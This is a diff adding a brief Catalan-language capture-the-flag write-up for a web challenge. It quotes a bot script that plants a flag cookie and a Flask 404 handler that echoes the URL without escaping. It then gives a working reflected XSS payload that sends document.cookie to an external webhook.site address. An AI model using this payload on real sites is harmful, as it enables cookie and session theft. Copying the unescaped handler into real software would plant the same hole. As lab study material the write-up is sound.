@@ -1,0 +1,36 @@
+
+
+La web fa: 
+
+    browser = webdriver.Chrome('chromedriver', options=options, service_args=['--verbose', '--log-path=/tmp/chromedriver.log'])
+
+    browser.get('http://127.0.0.1:1337/')
+
+    browser.add_cookie({
+        'name': 'flag',
+        'value': 'CHTB{f4k3_fl4g_f0r_t3st1ng}'
+    })
+
+    try:
+        browser.get(url)
+        WebDriverWait(browser, 5).until(lambda r: r.execute_script('return document.readyState') == 'complete')
+
+La cookie per defecte l'afegeix a l'ultima url visitada. La idea es robarla. Fent que accedeixi a localhost i redirigeixi la podem pillar.
+
+    @app.errorhandler(404)
+    def page_not_found(error): 
+        return "<h1>URL %s not found</h1><br/>" % unquote(request.url), 404
+
+Mostra a l'html el parametre de la url sense tractarlo :/ XSS
+
+http://127.0.0.1:1337/<script>document.write('<img src="https://webhook.site/d023af79-3f38-4cfa-8a79-faf1d71a50ed?cookie=' + document.cookie + '" />')</script>
+
+probablement no calgues fer el cookie= i les afegeixi igual al fer la redireccio, pero per si aca.
+
+
+
+
+
+
+
+
